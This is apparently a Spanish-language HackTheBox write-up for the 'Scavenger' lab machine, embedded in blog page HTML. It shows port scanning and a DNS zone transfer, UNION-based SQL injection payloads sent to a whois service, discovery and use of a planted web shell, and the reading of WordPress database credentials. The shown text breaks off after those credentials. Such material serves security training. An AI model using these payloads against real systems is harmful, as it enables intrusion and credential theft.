@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Scavenger - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Scavenger - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hola de nuevo el dia de hoy vamos a resolver la máquina Scavenger de la plataforma de hackthebox correspondiente a una maquina linux de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo whois, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo pcap para descubrir un rootkit ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario root." />
+<meta property="og:description" content="Hola de nuevo el dia de hoy vamos a resolver la máquina Scavenger de la plataforma de hackthebox correspondiente a una maquina linux de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo whois, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo pcap para descubrir un rootkit ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario root." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Scavenger" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Scavenger" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Scavenger/banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-23T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Scavenger/banner.png" />
+<meta property="twitter:title" content="Maquina Scavenger - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-06-23T00:00:00+00:00","datePublished":"2023-06-23T00:00:00+00:00","description":"Hola de nuevo el dia de hoy vamos a resolver la máquina Scavenger de la plataforma de hackthebox correspondiente a una maquina linux de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo whois, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo pcap para descubrir un rootkit ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario root.","headline":"Maquina Scavenger - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Scavenger/banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Scavenger"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Scavenger"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Scavenger - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-06-23">23 Jun 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Scavenger/banner.png" alt="Maquina Scavenger - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hola de nuevo el dia de hoy vamos a resolver la máquina <code>Scavenger</code> de la plataforma de <code>hackthebox</code> correspondiente a una maquina <code>linux</code> de dificultad dificil, la cual explotaremos obteniendo subdomios mediante un ataque de transferencia de zona y inyecciones sql en el protocolo <code>whois</code>, despues ganaremos acceso simulando una tty donde encontraremos credenciales que nos serviran para hacernos de recursos por ftp y donde analizaremos un archivo <code>pcap</code> para descubrir un <code>rootkit</code> ejecutandose en la maquina y a partir de este obtener privilegios maximos que nos permita obtener la flag del usuario <code>root</code>.</p>
+
+<p>Vamos a comenzar creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Scavenger
+❯ ls
+ Scavenger
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.155
+PING 10.10.10.155 (10.10.10.155) 56(84) bytes of data.
+64 bytes from 10.10.10.155: icmp_seq=1 ttl=63 time=123 ms
+
+--- 10.10.10.155 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 123.005/123.005/123.005/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>63</code>correspondiente a una maquina <code>linux</code>, ahora procederemos a el escaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.155 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:11 GMT
+Initiating SYN Stealth Scan at 22:11
+Scanning 10.10.10.155 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.155
+Discovered open port 21/tcp on 10.10.10.155
+Discovered open port 80/tcp on 10.10.10.155
+Discovered open port 53/tcp on 10.10.10.155
+Discovered open port 43/tcp on 10.10.10.155
+Completed SYN Stealth Scan at 22:12, 26.69s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.155
+Host is up, received user-set (0.16s latency).
+Scanned at 2023-06-23 22:11:41 GMT for 26s
+Not shown: 65496 filtered tcp ports (no-response), 32 filtered tcp ports (port-unreach), 2 closed tcp ports (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 63
+22/tcp open  ssh     syn-ack ttl 63
+43/tcp open  whois   syn-ack ttl 63
+53/tcp open  domain  syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.78 seconds
+           Raw packets sent: 131040 (5.766MB) | Rcvd: 39 (2.604KB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p21,22,43,53,80 10.10.10.155 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-23 22:12 GMT
+Nmap scan report for 10.10.10.155
+Host is up (0.19s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
+|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
+|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
+43/tcp open  whois?
+| fingerprint-strings: 
+|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
+|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+|     This query returned 0 object
+|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
+53/tcp open  domain  ISC BIND 9.10.3-P4 (Debian Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Debian
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.25 (Debian)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port43-TCP:V=7.92%I=7%D=6/23%Time=649618CF%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
+SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
+SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
+SF:0returned\x200\x20object\r\n")%r(GetRequest,A9,"%\x20SUPERSECHOSTING\x2
+SF:0WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20i
+SF:nformation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersecho
+SF:sting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n")%r(HTT
+SF:POptions,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
+SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
+SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
+SF:0returned\x200\x20object\r\n")%r(RTSPRequest,A9,"%\x20SUPERSECHOSTING\x
+SF:20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20
+SF:information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersech
+SF:osting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n")%r(He
+SF:lp,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.
+SF:1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20v
+SF:isit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x20retur
+SF:ned\x200\x20object\r\n")%r(SSLSessionReq,103,"%\x20SUPERSECHOSTING\x20W
+SF:HOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20inf
+SF:ormation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersechost
+SF:ing\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x20collations\x2
+SF:0\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_general_ci,COERCIBLE\
+SF:)\x20for\x20operation\x20'like'")%r(TerminalServerCookie,103,"%\x20SUPE
+SF:RSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20fo
+SF:r\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://w
+SF:ww\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\
+SF:x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_gener
+SF:al_ci,COERCIBLE\)\x20for\x20operation\x20'like'")%r(TLSSessionReq,103,"
+SF:%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r
+SF:\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x2
+SF:0http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20m
+SF:ix\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(u
+SF:tf8_general_ci,COERCIBLE\)\x20for\x20operation\x20'like'");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 114.00 seconds
+</code></pre>
+<p>Visulizamos informacion interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>21</td>
+      <td>FTP</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>43</td>
+      <td>WHOIS</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>53</td>
+      <td>DNS</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">EXPLOTACION <a href="#explotación">#</a></h2>
+
+<p>Observamos un servicio web ejecutandose en el puerto <code>80</code> y en el puerto <code>43</code> obtenemos un dominio que vamos a proceder a añadir en nuestro <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.155 supersechosting.htb www.supersechosting.htb" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Si ahora intentamos visualizar el servicio en el navegador se nos muestra un mensaje de que el servicio no esta disponible.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca1.PNG" alt="" /></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca2.PNG" alt="" /></p>
+
+<p>Ahora ya que nmap tambien nos reporto que el puerto <code>53</code> se encuentra abierto asi que con la herramienta <code>dig</code> vamos a intentar realizar un ataque de transferencia de zona, para poder obtener dominios validos.</p>
+
+<pre><code class="language-bash">❯ dig @10.10.10.155 supersechosting.htb axfr
+
+; &lt;&lt;&gt;&gt; DiG 9.16.27-Debian &lt;&lt;&gt;&gt; @10.10.10.155 supersechosting.htb axfr
+; (1 server found)
+;; global options: +cmd
+supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
+supersechosting.htb.	604800	IN	NS	ns1.supersechosting.htb.
+supersechosting.htb.	604800	IN	MX	10 mail1.supersechosting.htb.
+supersechosting.htb.	604800	IN	A	10.10.10.155
+ftp.supersechosting.htb. 604800	IN	A	10.10.10.155
+mail1.supersechosting.htb. 604800 IN	A	10.10.10.155
+ns1.supersechosting.htb. 604800	IN	A	10.10.10.155
+whois.supersechosting.htb. 604800 IN	A	10.10.10.155
+www.supersechosting.htb. 604800	IN	A	10.10.10.155
+supersechosting.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
+;; Query time: 436 msec
+;; SERVER: 10.10.10.155#53(10.10.10.155)
+;; WHEN: Fri Jun 23 22:23:59 GMT 2023
+;; XFR size: 10 records (messages 1, bytes 275)
+</code></pre>
+
+<p>Obtenemos una lista de subdominios que validaremos, despues de añadirlos a nuestro <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.155 ftp.supersechosting.htb mail1.supersechosting.htb ns1.supersechosting.htb whois.supersechosting.htb www.supersechosting.htb" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Logramos resolver un dominio, el cual nos da información acerca del servicio, como que se esta usando <code>php</code> y <code>mysql</code>, ademas tambien podemos ver información acerca de <code>whois</code> que curiosamente tiene expuesto la maquina.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca3.PNG" alt="" /></p>
+
+<p>Al conectarnos a <code>whois</code> a traves de telnet, vemos que utiliza como base de datos el servicio de <code>mariadb</code>.</p>
+
+<pre><code class="language-bash">❯ telnet 10.10.10.155 43
+Trying 10.10.10.155...
+Connected to 10.10.10.155.
+Escape character is '^]'.
+ 
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 0 object
+Connection closed by foreign host.
+</code></pre>
+
+<p>El servicio <code>WHOIS</code> siempre necesita utilizar una base de datos para almacenar y extraer la información. Por lo tanto, una posible <code>SQLInjection</code> podría funcionar al consultar la base de datos.</p>
+
+<pre><code class="language-bash">❯ nc 10.10.10.155 43
+'
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''') limit 1' at line 1
+</code></pre>
+
+<p>Mandamos una <code>'</code> en la consulta y vemos que recibimos un error de <code>sql</code>.</p>
+
+<pre><code class="language-bash">❯ nc 10.10.10.155 43
+') ORDER BY 2#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 0 object
+</code></pre>
+
+<p>Vamos a proceder a enumear la base de datos.</p>
+
+<pre><code class="language-bash">❯ nc 10.10.10.155 43
+') UNION SELECT database(), 2#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+whois
+
+❯ nc 10.10.10.155 43
+') UNION SELECT table_name,2 from information_schema.tables where table_schema='whois'#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+customers
+
+❯ nc 10.10.10.155 43
+') UNION SELECT column_name, 2 from information_schema.columns where table_name="customers" and table_schema="whois" LIMIT 0,1#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+id^C
+
+❯ nc 10.10.10.155 43
+') UNION SELECT column_name, 2 from information_schema.columns where table_name="customers" and table_schema="whois" LIMIT 1,1#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+domain^C
+
+❯ nc 10.10.10.155 43
+') UNION SELECT column_name, 2 from information_schema.columns where table_name="customers" and table_schema="whois" LIMIT 2,1#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 1 object
+data
+
+❯ nc 10.10.10.155 43
+') UNION SELECT domain, 2 FROM  customers#
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 4 object
+supersechosting.htbjustanotherblog.htbpwnhats.htbrentahacker.htb
+</code></pre>
+
+<p>Encontramos mas subdominios y entre ellos uno curioso <code>rentahacker.htb</code>, que si lo vemos en la pagina web no nos muestra información, pero podemos ejecutar un ataque de transferencia de zona de este subdominio.</p>
+
+<pre><code class="language-bash">❯ dig @10.10.10.155 rentahacker.htb axfr
+
+; &lt;&lt;&gt;&gt; DiG 9.16.27-Debian &lt;&lt;&gt;&gt; @10.10.10.155 rentahacker.htb axfr
+; (1 server found)
+;; global options: +cmd
+rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+rentahacker.htb.	604800	IN	NS	ns1.supersechosting.htb.
+rentahacker.htb.	604800	IN	MX	10 mail1.rentahacker.htb.
+rentahacker.htb.	604800	IN	A	10.10.10.155
+mail1.rentahacker.htb.	604800	IN	A	10.10.10.155
+sec03.rentahacker.htb.	604800	IN	A	10.10.10.155
+www.rentahacker.htb.	604800	IN	A	10.10.10.155
+rentahacker.htb.	604800	IN	SOA	ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+;; Query time: 443 msec
+;; SERVER: 10.10.10.155#53(10.10.10.155)
+;; WHEN: Fri Jun 23 22:49:07 GMT 2023
+;; XFR size: 8 records (messages 1, bytes 251)
+</code></pre>
+
+<p>Obtenemos dos subdominios nuevos que luego de añadirlos, visualizamos una pagina en <code>sec03.rentahacker.htb</code> con una imagen en relación a un hacker que ya nos da que pensar.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca4.PNG" alt="" /></p>
+
+<p>Anteriormente en uno de los subdominios vemos que se estaba utilizando como lenguaje a <code>php</code>, asi que vamos a tratar de buscar archivos con esa extensión con la ayuda de <code>wfuzz</code>.</p>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://sec03.rentahacker.htb/FUZZ.php
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000000015:   302        0 L      0 W        0 Ch        "index"                                                                                                               
+000000217:   200        57 L     340 W      4729 Ch     "signup"                                                                                                              
+000000027:   302        0 L      0 W        0 Ch        "search"                                                                                                              
+000000053:   200        57 L     339 W      4712 Ch     "login"                                                                                                               
+000000685:   200        0 L      0 W        0 Ch        "core"                                                                                                                
+000000190:   200        57 L     332 W      4667 Ch     "wiki"                                                                                                                
+000001688:   200        0 L      0 W        0 Ch        "shell"
+</code></pre>
+
+<p>Encontramos un archivo con un nombre muy descriptivo <code>shell</code> que curiosamente existe, y quiero pensar que al ser una shell debe ejecutarse a traves de un parametro que si bien no sabemos el nombre, con <code>wfuzz</code> igualmente podemos tratar de averiguarlo ejecutando un comando.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca5.PNG" alt="" /></p>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -t 200 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://sec03.rentahacker.htb/shell.php?FUZZ=whoami"
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000012593:   200        1 L      1 W        8 Ch        "hidden"                                                                                                              
+000014350:   200        0 L      0 W        0 Ch        "guildwars"                                                                                                           
+</code></pre>
+
+<p>Obtenemos que el nombre parametro corresponde a <code>hidden</code> y si lo validamos tenemos ejecución de comandos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca6.PNG" alt="" /></p>
+
+<p>Si ahora tratamos de mandarnos una reverse shell a nuestra maquina, vemos que nos resulta imposible debido a que la maquina tiene implementado reglas de firewall. Por ello para poder movernos de manera mas comoda vamos a usar una herramienta que nos permite tener acceso a una <code>tty</code> sobre http.</p>
+
+<ul>
+  <li><a href="https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py">https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py</a></li>
+</ul>
+
+<p>Para usarla simplemente debemos modificar la dirección url y el parametro al que corresponde nuestra shell.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca7.PNG" alt="" /></p>
+
+<pre><code class="language-bash">❯ rlwrap python3 tty_over_http.py
+whoami
+&gt; ib01c03
+ls -l /home
+&gt; total 24
+drwx------ 4 ib01c01 customers 4096 Sep  1  2021 ib01c01
+drwx------ 3 ib01c02 customers 4096 Sep  1  2021 ib01c02
+drwx------ 4 ib01c03 customers 4096 Sep  1  2021 ib01c03
+dr-xrwx--- 3 ib01ftp support   4096 Dec 10  2018 ib01ftp
+drwx------ 3 ib01www support   4096 Dec 10  2018 ib01www
+drwx------ 2 support support   4096 Sep 13  2022 support
+ls -l /home/ib01c03
+&gt; total 26576
+-rw-r--r--  1 ib01c03 customers 16689687 Oct 17  2018 bugtracker.2.18.tgz
+drwxr-xr-x 15 ib01c03 customers    12288 Dec 10  2018 sec03
+-rw-r--r--  1 ib01c03 customers 10503584 Dec  6  2018 wordpress.tgz
+drwxr-xr-x  5 ib01c03 customers     4096 Sep  1  2021 www
+</code></pre>
+
+<p>Vemos un archivo comprimido en <code>wordpress</code>, asi que podemos tratar de buscar el archivo <code>wp-config.php</code> que generalmente contiene credenciales.</p>
+
+<pre><code class="language-bash">find / -name wp-config.php 2&gt;/dev/null
+&gt; /home/ib01c03/www/wp-config.php
+cat /home/ib01c03/www/wp-config.php
+&gt; &lt;?php
+/** The name of the database for WordPress */
+define('DB_NAME', 'ib01c03');
+
+/** MySQL database username */
+define('DB_USER', 'ib01c03');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'Thi$sh1tIsN0tGut');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+</code></pre>
+
